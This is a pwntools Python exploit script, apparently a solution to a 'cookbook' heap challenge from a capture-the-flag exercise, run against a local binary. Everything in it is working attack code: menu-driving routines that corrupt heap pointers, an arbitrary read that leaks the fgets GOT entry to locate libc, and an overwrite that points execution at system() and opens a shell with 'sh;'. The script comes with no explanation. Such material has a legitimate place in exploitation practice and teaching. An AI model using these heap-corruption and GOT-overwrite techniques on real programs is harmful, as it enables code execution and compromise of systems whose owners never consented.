from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/bin/heap23_05_cookbook')
p = process('./data/bin/heap23_05_cookbook')
libc = elf.libc
system_off = libc.symbols['system']
fgets_off = libc.symbols['fgets']
RECIPE_LEN = 0x40c
CURR_INGR = 0x0804d09c
INGR_LIST = 0x0804d094
FGETS_GOT = 0x0804d020

def sl(l):
    p.sendline(l)

def main_menu():
    p.readuntil('[R]emove cookbook name\n[q]uit\n')

def recipe_menu():
    p.readuntil('[p]rint current recipe\n[q]uit\n')

def ingr_menu():
    p.readuntil("[q]uit (doesn't save)?\n[e]xport saving changes (doesn't quit)?\n")

def read_addr(addr):
    sl('c')
    recipe_menu()
    sl('n')
    recipe_menu()
    sl('d')
    recipe_menu()
    sl('q')
    main_menu()
    sl('g')
    p.readuntil("(hex because you're both a chef and a hacker!) : ")
    sl('{:x}'.format(RECIPE_LEN))
    sl(b'\x00'*8 + b'A'*(0x7c-8) + p32(addr))
    p.readuntil('the new name of the cookbook is')
    main_menu()
    sl('c')
    recipe_menu()
    sl('p')
    p.readuntil('recipe type: ')
    leak = p.readuntil('total cost :')
    ret = leak[:-(len('total cost :')+2)]
    recipe_menu()
    sl('q')
    main_menu()
    sl('R')
    main_menu()
    return ret

def read_ptr(addr):
    data = b''
    while len(data) < 4:
        last_read = read_addr(addr)
        if len(last_read) == 0:
            data += b'\x00'
        else:
            data += last_read
    return u32(data[:4])

def corrupt_curr_recipe_ptr(ingr_list_ptr, system_addr):
    sl('a')
    ingr_menu()
    sl('n')
    ingr_menu()
    sl('s')
    sl('0')
    ingr_menu()
    sl('p')
    sl('{}'.format(u32(p32(0x804cff8))))
    ingr_menu()
    sl('q')
    main_menu()
    sl('c')
    recipe_menu()
    sl('n')
    recipe_menu()
    sl('d')
    recipe_menu()
    sl('q')
    main_menu()
    sl('g')
    p.readuntil("(hex because you're both a chef and a hacker!) : ")
    sl('{:x}'.format(0x40c))
    fake_recipe = p32(ingr_list_ptr)+p32(CURR_INGR-4)
    sl(fake_recipe)
    p.readuntil('the new name of the cookbook is')
    main_menu()
    sl('c')
    recipe_menu()
    sl('r')
    p.readuntil('which ingredient to remove? ')
    sl('tomato\x00')
    recipe_menu()
    sl('q')
    main_menu()
    sl('a')
    ingr_menu()
    sl('g')
    sl(b'sh; \x00\x00\x00\x00' + p32(system_addr)*32)
    

p.readuntil(b'what\'s your name?\n');p.sendline(b'MYNAME')#step.1
main_menu()#step.2
ingr_list_ptr = read_ptr(INGR_LIST)#step.3
fgets_addr = read_ptr(FGETS_GOT)#step.4
libc_addr = fgets_addr - fgets_off;system_addr = libc_addr + system_off;corrupt_curr_recipe_ptr(ingr_list_ptr, system_addr)#step.5
p.interactive()